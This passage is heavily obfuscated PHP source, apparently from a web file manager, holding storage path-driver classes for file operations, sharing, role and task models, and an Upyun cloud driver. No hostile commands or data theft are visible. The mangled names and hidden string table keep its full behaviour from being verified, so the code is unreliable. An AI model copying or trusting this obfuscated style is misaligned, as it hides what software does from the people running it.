array($Õñáı«ï[1333] => $ êÂ„‘™), array($Õñáı«ï[1334] => $this->accessKey), array($Õñáı«ï[1335] => $ÂË»™Õ£))); $îµ€¨«­ = json_encode($îµ€¨«­); $…£ïßà¨ = hash_hmac($Õñáı«ï[232], $ÂË»™Õ£, $this->secret); $‰ÉüÄçÙ = sha1($îµ€¨«­); $å›¤Üû = hash_hmac($Õñáı«ï[232], $‰ÉüÄçÙ, $…£ïßà¨); $ÕÇ»’² = array($Õñáı«ï[1328] => $¬—ğĞ¶Æ, $Õñáı«ï[1332] => $²°óâˆæ, $Õñáı«ï[1336] => base64_encode($îµ€¨«­), $Õñáı«ï[1333] => $ êÂ„‘™, $Õñáı«ï[1334] => $this->accessKey, $Õñáı«ï[1337] => $ÂË»™Õ£, $Õñáı«ï[1338] => $å›¤Üû, $Õñáı«ï[181] => $this->getHost()); return $ÕÇ»’²; } public function fileOutLink($õúÕó—ï) { $ÑÑ×»›Î =& $_SERVER[ùÆÎÔ“Ñ]; if (substr($õúÕó—ï, 0, 7) == $ÑÑ×»›Î[1339]) { $õúÕó—ï = $ÑÑ×»›Î[1340] . substr($õúÕó—ï, 7); } header($ÑÑ×»›Î[161] . $õúÕó—ï); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($è¾¼šÜ¸) { $this->pathParse = $è¾¼šÜ¸; $this->model = Model($_SERVER[ùÆÎÔ“Ñ][1341]); } public function getPath($ñ›éàô) { return trim($ñ›éàô, $_SERVER[ùÆÎÔ“Ñ][8]); } public function pathFather($´¥ôÜ¬) { $ğ¬ß–ü° = $this->parse($´¥ôÜ¬); $ğ¬ß–ü° = $this->infoSimple($´¥ôÜ¬); return $ğ¬ß–ü° ? $ğ¬ß–ü°[$_SERVER[ùÆÎÔ“Ñ][432]] : !1; } public function pathThis($·œš“òõ) { $»ÉàÊÃ = $this->infoSimple($·œš“òõ); return $»ÉàÊÃ ? $»ÉàÊÃ[$_SERVER[ùÆÎÔ“Ñ][32]] : !1; } public function getPathOuter($¸ãœ¥·) { if (!$¸ãœ¥·) { return $¸ãœ¥·; } $ÂãĞì§Æ = $this->parse($¸ãœ¥·); return KodIO::make($ÂãĞì§Æ[$_SERVER[ùÆÎÔ“Ñ][399]]); } public function copyFolderFromIO($´ş·Á·â, $ù¢½°¦, $ÜÓ¬œğ³, $›îí½åà, $—¿„®šØ) { $³ÕÇäÓŠ = $this->model->copyFolderFromIO($´ş·Á·â, $ù¢½°¦, $ÜÓ¬œğ³, $›îí½åà, $—¿„®šØ); return KodIO::make($³ÕÇäÓŠ); } public function isParentOf($ûëæÌ£ä, $êÆë÷Á³) { return $this->model->isParentOf($ûëæÌ£ä, $êÆë÷Á³); } public function mkfile($Çá®Ã¦Æ, $²“Ş¨¿é = '', $ôøáäğ€ = REPEAT_RENAME) { $õ¢“Î =& $_SERVER[ùÆÎÔ“Ñ]; $Íõˆïƒ– = $this->parse($Çá®Ã¦Æ); $Çá®Ã¦Æ = $Íõˆïƒ–[$õ¢“Î[399]]; for ($ØÍÙÔ±û = 0; $ØÍÙÔ±û < count($Íõˆïƒ–[$õ¢“Î[1342]]); $ØÍÙÔ±û++) { $¶ÂĞ¼üÅ = $Íõˆïƒ–[$õ¢“Î[1342]][$ØÍÙÔ±û]; if ($ØÍÙÔ±û == count($Íõˆïƒ–[$õ¢“Î[1342]]) - 1) { $Çá®Ã¦Æ = $this->model->mkfile($Çá®Ã¦Æ, $¶ÂĞ¼üÅ, $²“Ş¨¿é, $ôøáäğ€); break; } $Çá®Ã¦Æ = $this->model->mkdir($Çá®Ã¦Æ, $¶ÂĞ¼üÅ, REPEAT_SKIP); } return $this->getPathOuter($Çá®Ã¦Æ); } public function mkdir($çöşÒ®Æ, $Ç©íï”‚ = REPEAT_SKIP) { $¹ïÕ°öñ =& $_SERVER[ùÆÎÔ“Ñ]; $¬„ã¿òº = $this->parse($çöşÒ®Æ); $çöşÒ®Æ = $¬„ã¿òº[$¹ïÕ°öñ[399]]; for ($İ‚˜±• = 0; $İ‚˜±• < count($¬„ã¿òº[$¹ïÕ°öñ[1342]]); $İ‚˜±•++) { $ğìùÆß¸ = $¬„ã¿òº[$¹ïÕ°öñ[1342]][$İ‚˜±•]; $çöşÒ®Æ = $this->model->mkdir($çöşÒ®Æ, $ğìùÆß¸, $Ç©íï”‚); } return $this->getPathOuter($çöşÒ®Æ); } public function copyFile($±º¥œØí, $˜ÒŞà–›, $¡œ‘—‰¸ = REPEAT_REPLACE) { $ùÎöûšÃ =& $_SERVER[ùÆÎÔ“Ñ]; $ş¡ô¼” = $this->parse($˜ÒŞà–›); $™šÃ‚ˆ = $this->model->copy($±º¥œØí, $ş¡ô¼”[$ùÎöûšÃ[399]], $¡œ‘—‰¸, $ş¡ô¼”[$ùÎöûšÃ[84]]); return $™šÃ‚ˆ ? $this->getPathOuter($™šÃ‚ˆ) : !1; } public function moveFile($Ñ•ÃÁÓ, $¶›‡¹†É, $æˆ¿òÀÀ = REPEAT_REPLACE) { $Ù¢¿¤Éš =& $_SERVER[ùÆÎÔ“Ñ]; $š×—å• = $this->parse($¶›‡¹†É); $ó‚¿˜Ù­ = $this->model->move($Ñ•ÃÁÓ, $š×—å•[$Ù¢¿¤Éš[399]], $æˆ¿òÀÀ, $š×—å•[$Ù¢¿¤Éš[84]]); return $ó‚¿˜Ù­ ? $this->getPathOuter($ó‚¿˜Ù­) : !1; } public function copy($˜Îê•‚¡, $‘Æ–Ğ¥Ã, $ºøé­¤Ò = REPEAT_REPLACE, $²Ò‡Äß = false) { $øİ†Øï• = $this->parse($‘Æ–Ğ¥Ã); $ûØØïŸ = $this->model->copy($˜Îê•‚¡, $øİ†Øï•[$_SERVER[ùÆÎÔ“Ñ][399]], $ºøé­¤Ò, $²Ò‡Äß); return $ûØØïŸ ? $this->getPathOuter($ûØØïŸ) : !1; } public function moveSameAllow() { } public function move($Š„ÂºÁù, $¾‰í›í, $×“½Ôºõ = REPEAT_REPLACE, $–÷ğÜó = false) { $±ğš¥Íù = $this->parse($¾‰í›í); $Á¬ß¥ = $this->model->move($Š„ÂºÁù, $±ğš¥Íù[$_SERVER[ùÆÎÔ“Ñ][399]], $×“½Ôºõ, $–÷ğÜó); return $Á¬ß¥ ? $this->getPathOuter($Á¬ß¥) : !1; } public function remove($¼ó·¢õ, $éÂºª« = true) { return $this->model->remove($¼ó·¢õ, $éÂºª«); } public function rename($•¨àÏ¾, $èèˆ¤üö) { $”·†¨¥– = $this->model->rename($•¨àÏ¾, $èèˆ¤üö); return $”·†¨¥– ? $this->getPathOuter($•¨àÏ¾) : $”·†¨¥–; } public function size($Úøí÷½‡) { $Ìê¢œÁ» = $this->infoSimple($Úøí÷½‡); return $Ìê¢œÁ» ? $Ìê¢œÁ»[$_SERVER[ùÆÎÔ“Ñ][76]] : 0; } public function infoSimple($ä£¿Æ†) { return $this->model->sourceInfo($ä£¿Æ†); } public function info($Øñæé“è) { return $this->infoParse($Øñæé“è); } public function infoAuth($ääÎ„À¥) { return $this->infoParse($ääÎ„À¥, !1, !0); } public function infoWithChildren($À·ß—¨Á) { return $this->infoParse($À·ß—¨Á, !0); } protected function infoParse($¦¬ººö, $ìªÄéšì = false, $´Âš¶Õ¥ = false) { if (!$ìªÄéšì) { return $this->model->pathInfo($¦¬ººö, $´Âš¶Õ¥); } return $this->model->pathInfoMore($¦¬ººö); } public function infoFull($—œÙ³•ş) { $±Ş–”á‹ =& $_SERVER[ùÆÎÔ“Ñ]; $·ÚÑ…’Æ = explode($±Ş–”á‹[8], $—œÙ³•ş); $¿©ÎÔÓ = implode($±Ş–”á‹[8], array_splice($·ÚÑ…’Æ, 1)); return $this->model->pathInfoByPath($·ÚÑ…’Æ[0], $¿©ÎÔÓ); } public function hashSimple($¥ÃÄŠ«ç) { $­ó±ÃÇÏ =& $_SERVER[ùÆÎÔ“Ñ]; $ñÎù¶– = $this->infoWithChildren($¥ÃÄŠ«ç); return $ñÎù¶–[$­ó±ÃÇÏ[170]][$­ó±ÃÇÏ[177]]; } public function hashMd5($ùÁê÷†ó) { $î×ĞØ—Ï =& $_SERVER[ùÆÎÔ“Ñ]; $÷Àèä”É = $this->infoWithChildren($ùÁê÷†ó); return $÷Àèä”É[$î×ĞØ—Ï[170]][$î×ĞØ—Ï[176]]; } public function exist($ÍÅ£âÈ‰) { $¨›ô½¼ =& $_SERVER[ùÆÎÔ“Ñ]; $µ²…¨î© = $this->parse($ÍÅ£âÈ‰); if (!$µ²…¨î©[$¨›ô½¼[84]]) { return $this->isFile($ÍÅ£âÈ‰) || $this->isFolder($ÍÅ£âÈ‰); } $š¬À£ = array($¨›ô½¼[401] => $µ²…¨î©[$¨›ô½¼[399]], $¨›ô½¼[32] => $µ²…¨î©[$¨›ô½¼[84]]); $°ĞÄçƒÖ = $this->model->where($š¬À£)->find(); return $°ĞÄçƒÖ ? !0 : !1; } public function isFile($ËÔ‰¡) { $Ë¥Õ±Šä =& $_SERVER[ùÆÎÔ“Ñ]; $úïßêæ = $this->infoSimple($ËÔ‰¡); return $úïßêæ && $úïßêæ[$Ë¥Õ±Šä[410]] == $Ë¥Õ±Šä[88] ? !1 : !0; } public function isFolder($Ş«…Ä¥ê) { $•’îòÔ¯ =& $_SERVER[ùÆÎÔ“Ñ]; $ûÃ©’×ü = $this->infoSimple($Ş«…Ä¥ê); return $ûÃ©’×ü && $ûÃ©’×ü[$•’îòÔ¯[410]] == $•’îòÔ¯[88] ? !0 : !1; } public function listPath($îş§ûø, $ƒïšÇ = false) { $· ­„ğ£ =& $_SERVER[ùÆÎÔ“Ñ]; if ($îş§ûø == $· ­„ğ£[12]) { return !1; } $ùè²ÜÀŸ = array($· ­„ğ£[401] => $îş§ûø); if ($ƒïšÇ) { return $this->model->listSource($ùè²ÜÀŸ, -1); } return $this->model->listSource($ùè²ÜÀŸ); } public function has($Ùêü½–¸, $úÍ™ÓÎ = false, $ÂÈô‘À· = null) { $ƒçÛ×ü =& $_SERVER[ùÆÎÔ“Ñ]; $ŞÊ¼‘Â¼ = $this->infoWithChildren($Ùêü½–¸); if ($úÍ™ÓÎ) { return array($ƒçÛ×ü[208] => $ŞÊ¼‘Â¼[$ƒçÛ×ü[208]], $ƒçÛ×ü[207] => $ŞÊ¼‘Â¼[$ƒçÛ×ü[207]]); } return $ÂÈô‘À· ? $ŞÊ¼‘Â¼[$ƒçÛ×ü[208]] : $ŞÊ¼‘Â¼[$ƒçÛ×ü[207]]; } public function listAll($ßò×…Ë¨) { $ñ‹‡¸Ùà = IO::info($this->pathParse[$_SERVER[ùÆÎÔ“Ñ][84]]); if (!$ñ‹‡¸Ùà) { return array(); } return $this->model->listAll($ßò×…Ë¨); } public function getContent($œ¸èë’) { return $this->model->getContent($œ¸èë’); } public function setContent($¦Ê—§‡Ú, $®şĞÖƒ§ = '') { return $this->model->setContent($¦Ê—§‡Ú, $®şĞÖƒ§); } public function fileSubstr($ßĞ‰Û›, $ÀúĞ“¿´, $úõ¢øùœ) { return $this->model->fileSubstr($ßĞ‰Û›, $ÀúĞ“¿´, $úõ¢øùœ); } public function download($–ÒõÇÚÚ, $È±”ù½Å = '') { $÷·ú©Å = get_path_father($È±”ù½Å); $±®“¥Û­ = get_path_this($È±”ù½Å); $’¼ÈˆÂ = $this->model->fileInfoGet($–ÒõÇÚÚ); $›´÷õ…Š = IO::copy($’¼ÈˆÂ[$_SERVER[ùÆÎÔ“Ñ][84]], $÷·ú©Å, !1, $±®“¥Û­); return $›´÷õ…Š; } public function setModifyTime($œÎï¶, $¼ïãüïÒ = '') { $‡»À´öÉ =& $_SERVER[ùÆÎÔ“Ñ]; if (!$œÎï¶) { return; } $this->model->where(array($‡»À´öÉ[417] => $œÎï¶))->save(array($‡»À´öÉ[85] => $¼ïãüïÒ)); } public function upload($Œò×„Ş¿, $¼ĞÙ¡, $ªû„æç× = false, $®Ÿ”ÒúÜ = REPEAT_REPLACE) { $ÓàøµŸ =& $_SERVER[ùÆÎÔ“Ñ]; $˜ÑøÌ€ = $this->parse($Œò×„Ş¿); $ÏæôáòÈ = $this->model->addFile($˜ÑøÌ€[$ÓàøµŸ[399]], $¼ĞÙ¡, $˜ÑøÌ€[$ÓàøµŸ[84]], $ªû„æç×, $®Ÿ”ÒúÜ); return $this->getPathOuter($ÏæôáòÈ); } public function uploadFileByID($±•Ñ¸á¦, $ŠÒŠóÊŸ, $Û„¯Şùğ) { $¢Ã‡¡ =& $_SERVER[ùÆÎÔ“Ñ]; $çœ‹¢ŒÃ = $this->parse($±•Ñ¸á¦); $ÍãáÄù = $this->model->addFileByFileID($çœ‹¢ŒÃ[$¢Ã‡¡[399]], $ŠÒŠóÊŸ, $çœ‹¢ŒÃ[$¢Ã‡¡[84]], $Û„¯Şùğ); return $this->getPathOuter($ÍãáÄù); } public function addFileByRemote($Å âé¦, $èÕóÚ¿, $”·ÖŞù¡ = array(), $Œ‰Çñı = '', $„×ÃÖøŸ) { $Ù¡…ô =& $_SERVER[ùÆÎÔ“Ñ]; $ÄíõóÆ´ = $this->parse($Å âé¦); $Œ‰Çñı = empty($Œ‰Çñı) ? $ÄíõóÆ´[$Ù¡…ô[84]] : $Œ‰Çñı; $˜›¬¨ö‘ = $this->model->addFileByRemote($ÄíõóÆ´[$Ù¡…ô[399]], $èÕóÚ¿, $Œ‰Çñı, $”·ÖŞù¡, $„×ÃÖøŸ); return $this->getPathOuter($˜›¬¨ö‘); } public function uploadLink($Ü·¡¤À, $ø’ğ‘şæ = 0) { $é¾ú¼£ =& $_SERVER[ùÆÎÔ“Ñ]; $ëäÜ¾ó = $this->parse($Ü·¡¤À); $Áú‹ãÉÅ = _get($GLOBALS[$é¾ú¼£[7]], $é¾ú¼£[1343]); $ÆÖÉâ®ë = _get($GLOBALS[$é¾ú¼£[7]], $é¾ú¼£[1344]); $Ü·¡¤À = Model($é¾ú¼£[609])->createFileName($ëäÜ¾ó[$é¾ú¼£[84]], $Áú‹ãÉÅ, $ÆÖÉâ®ë); return IO::uploadLink($Ü·¡¤À, $ø’ğ‘şæ); } public function fileNameAuto($ëÒ¢˜à‘, $¹Ò­éé®, $™õìı÷ã = REPEAT_REPLACE, $´¡×Éñõ = false) { return $this->model->fileNameAuto($ëÒ¢˜à‘, $¹Ò­éé®, $™õìı÷ã, $´¡×Éñõ); } public function fileNameExist($ğÁ¨‡ãë, $íçëÓ) { return $this->model->fileNameExist($ğÁ¨‡ãë, $íçëÓ); } protected function _fileOut($à×‡¬¨ü, $êã¦ôáë = false, $Ïİ‰×ôÍ = false, $œ´˜ö  = '', $”ò¾Àá‚ = false) { $ƒ ¬òÚ =& $_SERVER[ùÆÎÔ“Ñ]; $ßİƒ‚º¹ = $this->model->sourceInfo($à×‡¬¨ü); if ($ßİƒ‚º¹[$ƒ ¬òÚ[410]] == $ƒ ¬òÚ[88]) { header($ƒ ¬òÚ[1345]); die; } $½‘Ğ¥¤ = $this->model->fileInfoGet($à×‡¬¨ü); $œ´˜ö  = $½‘Ğ¥¤[$ƒ ¬òÚ[176]] ? $½‘Ğ¥¤[$ƒ ¬òÚ[176]] : $œ´˜ö ; $İ£¦“šÍ = isset($GLOBALS[$ƒ ¬òÚ[1346]]) ? $GLOBALS[$ƒ ¬òÚ[1346]] : $ßİƒ‚º¹[$ƒ ¬òÚ[32]]; if ($”ò¾Àá‚) { return IO::fileOutServer($½‘Ğ¥¤[$ƒ ¬òÚ[84]], $êã¦ôáë, $İ£¦“šÍ, $œ´˜ö ); } IO::fileOut($½‘Ğ¥¤[$ƒ ¬òÚ[84]], $êã¦ôáë, $İ£¦“šÍ, $œ´˜ö ); } public function fileOut($Á§£„é, $à”Š—° = false, $¸§…Äõà = false, $²£¹÷ª = '') { $this->_fileOut($Á§£„é, $à”Š—°, $¸§…Äõà, $²£¹÷ª); } public function fileOutServer($°çš™¨», $œ±¯˜×‰ = false, $ğÇˆáÔ = false, $ÖßˆŠ²Ò = '') { $this->_fileOut($°çš™¨», $œ±¯˜×‰, $ğÇˆáÔ, $ÖßˆŠ²Ò, !0); } protected function _fileOutImage($ç×ÅÍ Î, $ñ½°²ıÁ = 250) { $óÏÄèõ =& $_SERVER[ùÆÎÔ“Ñ]; $˜–´ª¹• = $this->model->pathInfo($ç×ÅÍ Î); if ($˜–´ª¹•[$óÏÄèõ[410]] == $óÏÄèõ[88]) { show_json($óÏÄèõ[1347] . $ç×ÅÍ Î, !1); } $—•ÄĞõ = $this->model->fileInfoGet($ç×ÅÍ Î); $—•ÄĞõ[$óÏÄèõ[32]] = $˜–´ª¹•[$óÏÄèõ[32]]; $—•ÄĞõ[$óÏÄèõ[169]] = $˜–´ª¹•[$óÏÄèõ[169]]; $GLOBALS[$óÏÄèõ[1346]] = $—•ÄĞõ[$óÏÄèõ[32]]; $GLOBALS[$óÏÄèõ[168]] = $—•ÄĞõ; IO::fileOutImage($—•ÄĞõ[$óÏÄèõ[84]], $ñ½°²ıÁ); } public function fileOutImage($ªĞ­ÈĞñ, $°ò øíÁ = 250) { $this->_fileOutImage($ªĞ­ÈĞñ, $°ò øíÁ); } public function fileOutImageServer($½²¬Û˜Õ, $ÎäºŸâ = 250) { $this->_fileOutImage($½²¬Û˜Õ, $ÎäºŸâ); } public function link($ÍÓ…¯¯€, $Ãò’À¸ = '') { $‚ÛØÀò = $this->model->fileInfoGet($ÍÓ…¯¯€); return IO::link($‚ÛØÀò[$_SERVER[ùÆÎÔ“Ñ][84]], $Ãò’À¸); } protected function parse($æ—öôœÉ) { $¦øóÍê§ =& $_SERVER[ùÆÎÔ“Ñ]; if (strstr($æ—öôœÉ, $¦øóÍê§[8]) === !1) { return array($¦øóÍê§[419] => intval($æ—öôœÉ), $¦øóÍê§[84] => $¦øóÍê§[12], $¦øóÍê§[1342] => array()); } $ª©¡îøÙ = explode($¦øóÍê§[8], trim($æ—öôœÉ, $¦øóÍê§[8])); if (count($ª©¡îøÙ) < 2) { show_tips(clear_html($æ—öôœÉ) . $¦øóÍê§[1348]); } return array($¦øóÍê§[419] => intval($ª©¡îøÙ[0]), $¦øóÍê§[84] => $ª©¡îøÙ[1], $¦øóÍê§[1342] => array_slice($ª©¡îøÙ, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($ÆõıÇŒ) { $this->pathParse = $ÆõıÇŒ; $this->model = Model($_SERVER[ùÆÎÔ“Ñ][1341]); } public function getPathOuter($“€âñàç) { $Æ„›ÂÆ =& $_SERVER[ùÆÎÔ“Ñ]; if (!$“€âñàç) { return $“€âñàç; } $ÀÌŠäã½ = $this->parse($“€âñàç); return trim(KodIO::makeShare($this->pathParse[$Æ„›ÂÆ[399]], $ÀÌŠäã½[$Æ„›ÂÆ[399]]), $Æ„›ÂÆ[8]); } protected function infoParse($—µÌ«±¢, $°ÉÅ • = false, $’ «§ö = false) { $½º§Íçë =& $_SERVER[ùÆÎÔ“Ñ]; $è‹É¤…µ = $this->pathParse[$½º§Íçë[399]]; $£¥¢¥Š‰ = trim($this->pathParse[$½º§Íçë[1174]], $½º§Íçë[8]); return Action($½º§Íçë[1349])->sharePathInfo($è‹É¤…µ, $£¥¢¥Š‰, $°ÉÅ •); } public function infoFull($ıÜ“ìĞ) { $®Üò¥’ =& $_SERVER[ùÆÎÔ“Ñ]; $â€Ê™ó = explode($®Üò¥’[8], trim($ıÜ“ìĞ, $®Üò¥’[8])); if (count($â€Ê™ó) > 1) { $«åÆæàÇ = implode($®Üò¥’[8], array_splice($â€Ê™ó, 1)); $ÓÅæ°Èò = $this->model->pathInfoByPath($â€Ê™ó[0], $«åÆæàÇ); if (!$ÓÅæ°Èò) { return !1; } $this->pathParse[$®Üò¥’[1174]] = $ÓÅæ°Èò[$®Üò¥’[402]]; } return $this->infoParse($ıÜ“ìĞ); } public function listAll($šÇÎ¡•¯) { $àÜÂÌÕ =& $_SERVER[ùÆÎÔ“Ñ]; $¸Ä×óÏù = IO::info($this->pathParse[$àÜÂÌÕ[84]]); if (!$¸Ä×óÏù) { return array(); } $ø™ªòå¼ = $this->model->listAll($šÇÎ¡•¯); $×³Á“ø = Model($àÜÂÌÕ[601])->getInfo($¸Ä×óÏù[$àÜÂÌÕ[489]]); $Ó¡§·³Î = Action($àÜÂÌÕ[1349]); foreach ($ø™ªòå¼ as &$¹ûµÏ¾ó) { check_abort(); $¹ûµÏ¾ó[$àÜÂÌÕ[86]] = $Ó¡§·³Î->_shareItemeParse($¹ûµÏ¾ó[$àÜÂÌÕ[86]], $×³Á“ø); } unset($¹ûµÏ¾ó); return $ø™ªòå¼; } } goto a¦ùº¦½é; fôÏÅ‡Ú™É: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\x6d\x2e\x72\157\154\145\x4c\151\x73\x74"; public $field = array("\x6e\141\155\145", "\141\x75\164\150", "\154\141\142\x65\154", "\x64\x69\x73\x70\x6c\x61\171", "\x73\171\x73\x74\x65\155", "\x64\145\x73\x63", "\151\147\x6e\x6f\162\x65\x45\170\164", "\x69\x67\156\157\162\145\x46\151\154\x65\x53\151\172\145", "\141\x64\x6d\x69\x6e\x69\163\x74\162\x61\164\157\x72", "\163\157\162\x74"); public function listData($×ÃãÌ‘® = false, $¹º‚‡Ô– = "\163\x6f\162\x74", $ÈÂÛşúŸ = false) { $ª±€Åš– =& $_SERVER[ùÆÎÔ“Ñ]; $ŒÒ”ãÌÜ = parent::listData($×ÃãÌ‘®, $¹º‚‡Ô–, $ÈÂÛşúŸ); if (!$×ÃãÌ‘®) { foreach ($ŒÒ”ãÌÜ as $¸ªÔúªÛ => $®•øô°Ç) { if ($®•øô°Ç[$ª±€Åš–[2055]] == 1) { $ŒÒ”ãÌÜ[$¸ªÔúªÛ][$ª±€Åš–[453]] = LNG($ª±€Åš–[2289]); } } } return $ŒÒ”ãÌÜ; } public function update($×Š§Ş…«, $‚×¡Ğ×) { $İè¬†ŒÌ =& $_SERVER[ùÆÎÔ“Ñ]; $³ŠÎà¥Ò = parent::listData($×Š§Ş…«); $°ÏÓÊµÄ = $this->findByName($‚×¡Ğ×[$İè¬†ŒÌ[32]]); if (!$³ŠÎà¥Ò || $°ÏÓÊµÄ && $°ÏÓÊµÄ[$İè¬†ŒÌ[399]] != $³ŠÎà¥Ò[$İè¬†ŒÌ[399]]) { return !1; } if ($°ÏÓÊµÄ[$İè¬†ŒÌ[2055]] == 1) { $‚×¡Ğ× = array($İè¬†ŒÌ[32] => $‚×¡Ğ×[$İè¬†ŒÌ[32]], $İè¬†ŒÌ[1880] => $‚×¡Ğ×[$İè¬†ŒÌ[1880]]); } $this->filterAuth($‚×¡Ğ×[$İè¬†ŒÌ[413]]); return parent::update($×Š§Ş…«, $‚×¡Ğ×); } public function remove($ ”úÇ®) { $ ¼Ëú‚” = parent::listData($ ”úÇ®); if (!$ ¼Ëú‚” || $ ¼Ëú‚”[$_SERVER[ùÆÎÔ“Ñ][1290]]) { return !1; } return parent::remove($ ”úÇ®); } public function add($ Ì¸Ç¬’) { $‡ÈùÛ½Ÿ =& $_SERVER[ùÆÎÔ“Ñ]; $õğû¾º = $ Ì¸Ç¬’[$‡ÈùÛ½Ÿ[32]]; if ($this->findByName($õğû¾º)) { return !1; } $’ãœ×‹— = array($‡ÈùÛ½Ÿ[420] => $õğû¾º, $‡ÈùÛ½Ÿ[1863] => $‡ÈùÛ½Ÿ[12], $‡ÈùÛ½Ÿ[1859] => $‡ÈùÛ½Ÿ[1867], $‡ÈùÛ½Ÿ[2290] => 1, $‡ÈùÛ½Ÿ[1862] => 0, $‡ÈùÛ½Ÿ[2291] => 0, $‡ÈùÛ½Ÿ[1861] => $this->getSort()); $ Ì¸Ç¬’ = array_merge($’ãœ×‹—, $ Ì¸Ç¬’); $this->filterAuth($ Ì¸Ç¬’[$‡ÈùÛ½Ÿ[413]]); return parent::insert($ Ì¸Ç¬’); } private function getSort() { $„Ò÷˜£ =& $_SERVER[ùÆÎÔ“Ñ]; $ß¯æèŸÓ = parent::listData(); $€àÌâÁ = array_to_keyvalue($ß¯æèŸÓ, $„Ò÷˜£[12], $„Ò÷˜£[1881]); return empty($€àÌâÁ) ? 0 : max($€àÌâÁ) + 1; } private function filterAuth(&$ø´ø¸†¢) { $µÇŠ·¯¶ =& $_SERVER[ùÆÎÔ“Ñ]; $–şµ›È• = array(); $œ¸×³ìò = array_filter(explode($µÇŠ·¯¶[50], $ø´ø¸†¢)); foreach ($œ¸×³ìò as $ø´ø¸†¢) { $â…§¥‡» = explode($µÇŠ·¯¶[10], $ø´ø¸†¢); if ($â…§¥‡»[0] == $µÇŠ·¯¶[2292] && $â…§¥‡»[1] != $µÇŠ·¯¶[1196]) { $˜Ü„åØ = $â…§¥‡»[0] . $µÇŠ·¯¶[10] . $â…§¥‡»[1] . $µÇŠ·¯¶[2293]; if (!in_array($˜Ü„åØ, $œ¸×³ìò)) { $–şµ›È•[] = $˜Ü„åØ; } } $–şµ›È•[] = $ø´ø¸†¢; } $ø´ø¸†¢ = implode($µÇŠ·¯¶[50], $–şµ›È•); } public function findRoleDefault() { $¡¥î‚á² =& $_SERVER[ùÆÎÔ“Ñ]; $–ƒ²Çõâ = parent::listData(); $äúŠÌâ¦ = !1; foreach ($–ƒ²Çõâ as $ÑÙÅ²ïü) { if (!$ÑÙÅ²ïü || $ÑÙÅ²ïü[$¡¥î‚á²[1879]] == $¡¥î‚á²[197] || $ÑÙÅ²ïü[$¡¥î‚á²[2055]] == 1) { continue; } if (strstr($ÑÙÅ²ïü[$¡¥î‚á²[413]], $¡¥î‚á²[2294])) { continue; } if (!strstr($ÑÙÅ²ïü[$¡¥î‚á²[413]], $¡¥î‚á²[2295])) { continue; } if (!$äúŠÌâ¦) { $äúŠÌâ¦ = $ÑÙÅ²ïü; continue; } $²É¤ğÈ = explode($¡¥î‚á²[50], $äúŠÌâ¦[$¡¥î‚á²[413]]); $¶ñŸ•Úï = explode($¡¥î‚á²[50], $ÑÙÅ²ïü[$¡¥î‚á²[413]]); if (count($²É¤ğÈ) > count($¶ñŸ•Úï)) { $äúŠÌâ¦ = $ÑÙÅ²ïü; } } return $äúŠÌâ¦ ? $äúŠÌâ¦[$¡¥î‚á²[399]] : $¡¥î‚á²[12]; } public function sort($˜Èí Ãá, $¸Ãã£³ô) { return parent::update($˜Èí Ãá, $¸Ãã£³ô); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\145\x6d\x2e\164\141\x73\x6b\x4c\x69\163\x74"; public $field = array("\x6e\x61\155\145", "\x74\x79\160\x65", "\x65\x76\145\156\164", "\x74\x69\x6d\145", "\144\x65\163\x63", "\163\x79\163\x74\x65\x6d", "\x65\156\141\142\154\145", "\x6c\x61\163\x74\x52\165\156", "\x73\157\x72\164"); public function listData($ñÏÚèâí = false, $¹Ô«Ùõ = "\163\157\162\164", $„À×¢èÕ = false) { return parent::listData($ñÏÚèâí, $¹Ô«Ùõ, $„À×¢èÕ); } public function add($Ëâ´Ô‚Ø) { $Ç™Ä™½ø =& $_SERVER[ùÆÎÔ“Ñ]; $ãÁ¯¢Ñ“ = $this->findByName($Ëâ´Ô‚Ø[$Ç™Ä™½ø[32]]); if ($ãÁ¯¢Ñ“) { return !1; } $Ëâ´Ô‚Ø[$Ç™Ä™½ø[1627]] = 0; $Ëâ´Ô‚Ø[$Ç™Ä™½ø[1881]] = $this->getSort(); return parent::insert($Ëâ´Ô‚Ø); } private function getSort() { $ù»¤£¡¤ =& $_SERVER[ùÆÎÔ“Ñ]; $Óı­úİ² = parent::listData(); $˜Šèµñô = array_to_keyvalue($Óı­úİ², $ù»¤£¡¤[12], $ù»¤£¡¤[1881]); return empty($˜Šèµñô) ? 0 : max($˜Šèµñô) + 1; } public function update($‘ã•û¢”, $óØÙšïì) { $Ã‘íÔÄ‘ =& $_SERVER[ùÆÎÔ“Ñ]; $†£Ò«Âí = $this->listData($‘ã•û¢”); $÷øÌñûŠ = $this->findByName($óØÙšïì[$Ã‘íÔÄ‘[32]]); if (!$†£Ò«Âí || $÷øÌñûŠ && $÷øÌñûŠ[$Ã‘íÔÄ‘[399]] != $†£Ò«Âí[$Ã‘íÔÄ‘[399]]) { return !1; } return parent::update($‘ã•û¢”, $óØÙšïì); } public function remove($ã»í©Ç™, $±«‹Şø = false) { $¢Çâ¹÷… =& $_SERVER[ùÆÎÔ“Ñ]; $íÍ°äÂ = $this->listData($ã»í©Ç™); if (!$íÍ°äÂ) { return; } if (!$±«‹Şø && $íÍ°äÂ[$¢Çâ¹÷…[1290]] == $¢Çâ¹÷…[88]) { return !1; } return parent::remove($ã»í©Ç™); } public function enable($§¬ğ³ëû, $¯ÌÕÁıê) { return $this->update($§¬ğ³ëû, array($_SERVER[ùÆÎÔ“Ñ][2284] => $¯ÌÕÁıê)); } public function run($¾ßùá”Ñ) { return $this->update($¾ßùá”Ñ, array($_SERVER[ùÆÎÔ“Ñ][2296] => time())); } } goto A°³À—à¦; Dìµ¬¨•Ì‰: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\x74\164\160\x3a\x2f\x2f\166\x30\x2e\141\x70\x69\56\165\x70\171\165\x6e\56\x63\x6f\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($»Ë›¬’‹) { parent::__construct(); $this->_init($»Ë›¬’‹); } public function _init($¯»ëáñã) { $Öß™Œıİ =& $_SERVER[ùÆÎÔ“Ñ]; foreach ($¯»ëáñã as $àßÔš…¶ => $µÇï¦Ô) { if (isset($this->{$àßÔš…¶})) { $this->{$àßÔš…¶} = $µÇï¦Ô; } } if (empty($this->username) || 